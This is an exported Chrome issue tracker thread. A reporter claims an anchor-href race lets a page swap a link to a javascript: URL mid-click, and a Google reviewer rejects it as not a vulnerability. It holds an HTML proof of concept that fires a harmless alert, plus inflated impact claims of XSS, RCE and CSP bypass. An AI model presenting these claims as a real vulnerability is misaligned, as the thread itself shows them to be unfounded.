@@ -1,0 +1,132 @@
+Issue ID: 434530669
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Chrome Vulnerability Report: Anchor href TOCTOU Attack Leads to javascript: Execution</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>A Time-of-Check to Time-of-Use (TOCTOU) race condition exists in Chrome’s anchor click handling. An attacker can create a seemingly safe <span>&lt;a&gt;</span> element pointing to a benign https:// URL, then change its href to a malicious javascript: or data: URL during the user’s click interaction (after pointerdown, before click).
+If the user clicks and releases the link, Chrome navigates to the newly swapped href — executing arbitrary JavaScript in the origin of the page.</p>
+<p>This violates Chrome&#39;s expected security model of &quot;locking&quot; the link destination at interaction start, enabling:</p>
+<pre><code>XSS bypasses in trusted applications
+
+Execution of malicious code through user interaction
+
+Link spoofing/deception
+</code></pre>
+<h2>Proof-of-Concept (PoC)</h2>
+<p>put it in html page</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;TOCTOU Preloading Test&lt;/h1&gt;
+    &lt;a id=&quot;test-link&quot; href=&quot;https://www.google.com&quot; style=&quot;font-size: 2em; border: 2px solid black; padding: 10px;&quot;&gt;
+        Click and HOLD me for a moment, then release.
+    &lt;/a&gt;
+    &lt;p id=&quot;log&quot;&gt;&lt;/p&gt;
+
+    &lt;script&gt;
+        const link = document.getElementById(&#39;test-link&#39;);
+        const log = document.getElementById(&#39;log&#39;);
+
+        const safeUrl = &quot;https://www.google.com&quot;; // The &quot;check&quot; URL
+        const maliciousUrl = &quot;javascript:alert(00)&quot;; // The &quot;use&quot; URL
+
+        link.addEventListener(&#39;pointerdown&#39;, () =&gt; {
+            log.textContent = `Pointer Down! Href is currently ${link.href}. Changing it...`;
+            // The switch! This happens after the browser has already been notified
+            // of the original &quot;safe&quot; href.
+            setTimeout(() =&gt; {
+                link.href = maliciousUrl;
+                log.textContent += `\n Href is now ${link.href}. Release the mouse button.`;
+            }, 0); // setTimeout with 0ms ensures this runs in a new task after the initial event handling.
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>Expected Behavior</p>
+<p>Chrome should lock the href on pointerdown. Clicking the link should open <a href="https://google.com" data-b-widget="url" data-b-original-href="https://google.com" data-b-redirected-href="https://www.google.com/url?q=https://google.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0VT8wnjtPCJ_ZzcGf2doE0">https://google.com</a>.
+❌ Actual Behavior</p>
+<pre><code>Link starts as https://google.com
+
+User presses and holds → href is updated during the hold
+
+User releases → Chrome navigates to javascript: and executes attacker-controlled code
+</code></pre>
+<h2>Impact</h2>
+<p>This flaw allows:</p>
+<pre><code>Client-side XSS by bypassing URL sanitizers
+
+Link spoofing and phishing (what the user sees is not what they get)
+
+Potential RCE in Electron / hybrid apps using Chromium
+
+CSP bypass in environments trusting href values
+</code></pre>
+<h2>Attack Scenarios</h2>
+<pre><code>Client-side XSS on trusted platforms (Slack, Gmail, Notion, etc.)
+
+Social engineering and phishing via deceptive links
+
+Exploitation in Electron apps (where javascript: or file:// can lead to RCE)
+
+CSP bypass via data: or javascript: injection
+</code></pre>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Version 138.0.7204.169 (Official Build) (64-bit)</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Clickjacking</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>fekirine djallal known as (djallalakira)</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: dj...@gmail.com
+Chrome Vulnerability Report: Anchor href TOCTOU Attack Leads to javascript: Execution
+
+Author: dj...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: dj...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: aj...@google.com
+<p>Links and userinfo are entirely under the control of the site, so this is not a vulnerability.</p>
+<p><a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#where-are-the-security-indicators-located-in-the-browser-window" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#where-are-the-security-indicators-located-in-the-browser-window" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/HEAD/docs/security/faq.md%23where-are-the-security-indicators-located-in-the-browser-window&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0uPh7AoFDZbzyWDM_VtMa4">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#where-are-the-security-indicators-located-in-the-browser-window</a></p>
+
+Author: aj...@google.com
+googlers_unrestricted
+
+Author: aj...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: aj...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
